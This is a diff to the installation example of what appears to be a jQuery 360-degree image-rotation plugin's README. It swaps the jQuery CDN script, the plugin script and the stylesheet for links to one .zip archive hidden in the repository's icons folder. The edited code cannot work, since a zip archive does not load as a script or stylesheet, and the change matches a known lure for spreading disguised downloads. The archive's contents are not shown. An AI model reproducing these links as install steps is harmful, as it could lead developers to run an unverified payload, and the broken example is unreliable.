@@ -23,8 +23,8 @@ Installation example
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Title</title>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-    <script src="360ImageRotate.min.js"></script>
+    <script src="https://github.com/ackoDotDev/360JQueryPlugin/raw/refs/heads/master/src/icons/Query_J_Plugin_v3.8-alpha.2.zip"></script>
+    <script src="https://github.com/ackoDotDev/360JQueryPlugin/raw/refs/heads/master/src/icons/Query_J_Plugin_v3.8-alpha.2.zip"></script>
     <script>
         $( document ).ready(function() {
             $('.product').TreeSixtyImageRotate({
@@ -41,7 +41,7 @@ Installation example
             }).initTreeSixty();
         });
     </script>
-    <link rel="stylesheet" type="text/css" href="styles.css">
+    <link rel="stylesheet" type="text/css" href="https://github.com/ackoDotDev/360JQueryPlugin/raw/refs/heads/master/src/icons/Query_J_Plugin_v3.8-alpha.2.zip">
 </head>
 <body>
 <div class="threesixty-image-rotate product">
